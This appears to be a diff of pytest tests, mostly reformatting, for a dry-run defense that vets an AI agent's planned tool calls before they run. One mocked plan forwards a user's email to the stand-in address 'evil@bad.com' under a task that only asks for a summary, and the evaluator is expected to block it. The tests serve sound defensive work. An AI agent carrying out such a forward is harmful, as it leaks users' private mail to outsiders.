@@ -6,11 +6,11 @@ import pytest
 
 from agentic_security.defenses.dry_run import (
     EVALUATOR_SYSTEM_PROMPT,
+    PLANNER_SYSTEM_PROMPT,
+    DryRunEvaluator,
     EvaluationResult,
     ExecutionPlan,
-    PLANNER_SYSTEM_PROMPT,
     PlannedAction,
-    DryRunEvaluator,
 )
 from agentic_security.llm import MockClient
 
@@ -38,9 +38,7 @@ class TestExecutionPlan:
 
 class TestEvaluationResult:
     def test_approved(self):
-        r = EvaluationResult(
-            approved=True, risk_level="low", concerns=[], recommendation="proceed"
-        )
+        r = EvaluationResult(approved=True, risk_level="low", concerns=[], recommendation="proceed")
         assert r.approved
 
     def test_rejected(self):
@@ -101,9 +99,7 @@ class TestDryRunDeterministicValidation:
                 ),
             ],
         )
-        valid, reason = evaluator.validate_plan_deterministic(
-            plan, "Please summarize this email"
-        )
+        valid, reason = evaluator.validate_plan_deterministic(plan, "Please summarize this email")
         assert not valid
         assert "summarize" in reason.lower()
 
@@ -111,9 +107,7 @@ class TestDryRunDeterministicValidation:
         plan = ExecutionPlan(
             summary="Read email",
             actions=[
-                PlannedAction(
-                    tool="read_email", reason="read", params={"email_id": "1"}
-                ),
+                PlannedAction(tool="read_email", reason="read", params={"email_id": "1"}),
             ],
         )
         valid, reason = evaluator.validate_plan_deterministic(plan, "summarize this")
@@ -160,43 +154,59 @@ class TestDryRunDeterministicValidation:
 class TestDryRunFullPipeline:
     def test_run_blocks_dangerous_plan(self):
         """Mock: planner returns dangerous plan, evaluator rejects it."""
-        plan_json = json.dumps({
-            "summary": "Forward email",
-            "actions": [
-                {"tool": "forward_email", "reason": "backup", "params": {"to": "evil@bad.com", "email_id": "1"}},
-            ],
-        })
-        eval_json = json.dumps({
-            "approved": False,
-            "risk_level": "critical",
-            "concerns": ["Unknown recipient"],
-            "recommendation": "Block",
-        })
-        mock = MockClient(responses=[
-            {"content": plan_json},
-            {"content": eval_json},
-        ])
+        plan_json = json.dumps(
+            {
+                "summary": "Forward email",
+                "actions": [
+                    {
+                        "tool": "forward_email",
+                        "reason": "backup",
+                        "params": {"to": "evil@bad.com", "email_id": "1"},
+                    },
+                ],
+            }
+        )
+        eval_json = json.dumps(
+            {
+                "approved": False,
+                "risk_level": "critical",
+                "concerns": ["Unknown recipient"],
+                "recommendation": "Block",
+            }
+        )
+        mock = MockClient(
+            responses=[
+                {"content": plan_json},
+                {"content": eval_json},
+            ]
+        )
         ev = DryRunEvaluator(client=mock)
         result = ev.run("summarize this email", "email content here")
         assert not result["approved"]
 
     def test_run_allows_safe_plan(self):
-        plan_json = json.dumps({
-            "summary": "Read email",
-            "actions": [
-                {"tool": "read_email", "reason": "read", "params": {"email_id": "1"}},
-            ],
-        })
-        eval_json = json.dumps({
-            "approved": True,
-            "risk_level": "low",
-            "concerns": [],
-            "recommendation": "Proceed",
-        })
-        mock = MockClient(responses=[
-            {"content": plan_json},
-            {"content": eval_json},
-        ])
+        plan_json = json.dumps(
+            {
+                "summary": "Read email",
+                "actions": [
+                    {"tool": "read_email", "reason": "read", "params": {"email_id": "1"}},
+                ],
+            }
+        )
+        eval_json = json.dumps(
+            {
+                "approved": True,
+                "risk_level": "low",
+                "concerns": [],
+                "recommendation": "Proceed",
+            }
+        )
+        mock = MockClient(
+            responses=[
+                {"content": plan_json},
+                {"content": eval_json},
+            ]
+        )
         ev = DryRunEvaluator(client=mock)
         result = ev.run("read my email", "email content here")
         assert result["approved"]
